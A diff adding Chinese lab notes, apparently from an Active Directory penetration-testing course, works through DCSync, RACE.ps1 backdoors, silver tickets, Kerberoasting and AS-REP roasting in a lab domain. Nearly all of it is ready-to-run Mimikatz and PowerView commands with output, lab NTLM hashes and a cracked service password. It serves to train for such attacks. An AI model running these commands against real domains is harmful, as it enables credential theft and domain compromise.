@@ -756,3 +756,338 @@ ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
 可以访问文件系统，但是不能在这台系统上执行命令。
 
 如果想要用DSRM获得一个shell，可以设置一个定时任务
+
+
+
+# Learning Objective 12:
+```Task
+● Check if studentx has Replication (DCSync) rights.
+● If yes, execute the DCSync attack to pull hashes of the krbtgt user.
+● If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.
+```
+
+
+
+## Check if studentx has Replication (DCSync) rights.
+
+查看当前账号是否有DCSync的能力
+
+```
+Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
+
+```
+
+
+
+![image-20220307205932704](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307205932704.png)
+
+
+
+没有任何返回，说明没有DCSync的能力
+
+## If yes, execute the DCSync attack to pull hashes of the krbtgt user.
+
+问题前提不成立
+
+## If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.
+
+开一个DA的shell
+
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
+```
+
+
+
+添加完全控制权限
+```
+Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student366 -Rights All -Verbose
+```
+再把Dcsync权限赋予当前学生账号student366
+```
+Add-ObjectAcl -TargetDistinguishedName"dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student366 -Rights DCSync -Verbose
+```
+
+再次查看本账号是否有Dcsync权限
+
+```
+Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
+```
+
+![image-20220307210310991](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307210310991.png)
+
+已经出现```ActiveDirectoryRights : GenericAll```表示成功赋权
+
+执行Dcsync,导出krbtgt哈希（也可以是其他用户,此操作需要在DA权限的shell里操作）
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
+
+
+
+![image-20220307210510322](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307210510322.png)
+
+
+
+# Learning Objective 13:
+```Task
+● Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.
+● Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.
+```
+
+## Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.
+
+
+
+在DA权限shell引入RACE.ps1框架
+```
+PS C:\ad> . .\RACE.ps1
+```
+
+为WMI修改安全描述符，允许student366进入WMI
+```
+Set-RemoteWMI -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
+```
+
+在学生shell（重启VM生效）查看
+```
+gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+
+
+
+![image-20220307215612058](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307215612058.png)
+
+
+
+## Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.
+
+
+
+设置远程权限，报错
+```
+PS C:\ad> Set-RemotePSRemoting -SamAccountName student366 -ComputerName dcorp-dc -Verbose
+Processing data for a remote command failed with the following error message: The I/O operation has been aborted
+because of either a thread exit or an application request. For more information, see the about_Remote_Troubleshooting
+Help topic.
+    + CategoryInfo          : OperationStopped: (dcorp-dc:String) [], PSRemotingTransportException
+    + FullyQualifiedErrorId : JobFailure
+    + PSComputerName        : dcorp-dc
+```
+
+引入RACE.ps1，域名写全(注意：这里如果不能正常设置，enter-psssesion到DC，bypass AMSI，远程加载RACE.ps1后在DC上设置)
+```
+PS C:\ad> . .\RACE.ps1
+PS C:\ad> Set-RemotePSRemoting -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
+```
+
+
+在学生shell向DC执行whoami命令
+```
+Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+
+
+
+![image-20220307221601057](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307221601057.png)
+
+
+
+### 无管理员密码的情况下从目标机器上dump出哈希
+
+在DC上修改权限，允许本账号（student366）远程dump出哈希，在DAshell
+```
+Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student366 -Verbose
+```
+
+在学生shell
+引入框架
+```
+PS C:\ad> . .\RACE.ps1
+```
+
+dump出dcorp-dc这台机器的哈希
+```
+PS C:\ad> Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+
+ComputerName                        MachineAccountHash
+------------                        ------------------
+dcorp-dc.dollarcorp.moneycorp.local 2b3cc837d80b9f5f69271cdfe5433822
+```
+
+现在我们有了这台机器的哈希，可以用来制作银票
+
+```
+Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:2b3cc837d80b9f5f69271cdfe5433822 /user:Administrator /ptt"'
+```
+
+基于HOST服务的银票
+
+![image-20220307222449438](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307222449438.png)
+
+基于RPCSS服务的银票
+
+```
+Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:2b3cc837d80b9f5f69271cdfe5433822 /user:Administrator /ptt"'
+```
+
+
+
+![image-20220307222528731](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307222528731.png)
+
+可以建一个定时任务反弹DC这台服务器的shell
+
+
+
+# Learning Objective 14:
+```Task
+● Using the Kerberoast attack, crack password of a SQL server service account.
+```
+
+
+
+什么是SPN？
+> SPN(Service Principal name)服务器主体名称。
+> 在使用 Kerberos 身份验证的网络中，必须在内置计算机帐户（如 NetworkService 或 LocalSystem）或用户帐户下为服务器注册 SPN。对于内置帐户，SPN 将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户手动注册SPN。
+
+查找所有SPN，会有很多返回，但主要查看域管理员开启的服务
+
+```
+Get-NetUser -spn |select userprincipalname,serviceprincipalname
+```
+
+
+
+![image-20220307223014352](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307223014352.png)
+
+
+
+尤其留意域管理员的信息，这里svcadmin开启了SQL server服务。
+
+因为svcadmin是一个域管理员，所以我们可以以它开启的服务请求一个tikcet
+
+下面两条命令在学生shell下执行，如果报错了，可能是student VM的网络问题，重启一下
+
+```
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
+```
+
+
+
+![image-20220307223752293](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307223752293.png)
+
+
+
+klist查看
+
+![image-20220307223948494](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307223948494.png)
+
+
+
+有MSSQLSvc的TGS。client就是学生账号student366
+
+用Mimikatz dump出tikets
+
+
+
+![image-20220307224108424](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307224108424.png)
+
+
+
+在当前目录生成了一个TGS文件```1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi```
+
+拷贝到文件夹```kerberoast```，使用```tgsrepcrack.py```破解密码
+执行命令：
+
+```
+python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+```
+
+
+
+![image-20220307224347704](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307224347704.png)
+
+
+
+得到了svcadmin的明文密码
+```
+*ThisisBlasphemyThisisMadness!!
+```
+
+用上面的明文密码登陆dcorp-dc，输入明文密码后可以成功登录
+
+![image-20220307224555333](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307224555333.png)
+
+
+
+# Learning Objective 15:
+```Task
+● Enumerate users that have Kerberos Preauth disabled.
+● Obtain the encrypted part of AS-REP for such an account.
+● Determine if studentx has permission to set User Account Control flags for any user.
+● If yes, disable Kerberos Preauth on such a user and obtain encrypted part of AS-REP.
+```
+
+
+
+## Enumerate users that have Kerberos Preauth disabled.
+
+注意这里用的是dev版本的PowerView
+
+枚举禁用了Kerberos预认证的用户
+
+![image-20220307225109594](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307225109594.png)
+
+
+
+## Obtain the encrypted part of AS-REP for such an account.
+
+枚举到一个VPN359user用户禁用了Kerberos预认证
+使用ASREPRoast.ps1获取kerb哈希值，这个值可以使用john等破解工具破解
+
+![image-20220307225326455](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307225326455.png)
+
+
+
+
+
+## Determine if studentx has permission to set User Account Control flags for any user.
+
+枚举RDPUsers组成员对其中有GenericWrite 或者 GenericAll权限的用户
+
+![image-20220307225619988](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307225619988.png)
+
+
+
+因为当前账号（student366）在RDPUsers组中，而RDPUsers组对上面这些用户有GenericAll或者GenericWrite的权限，所以可以强制关闭这些用户的预认证
+```
+ Set-DomainObject -Identity Control359User -XOR @{useraccountcontrol=4194304} -Verbose
+```
+
+关闭以后获取这个用户的krb5哈希
+
+```
+Get-ASREPHash -UserName Control359User -Verbose
+```
+
+
+
+![image-20220307225731335](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307225731335.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
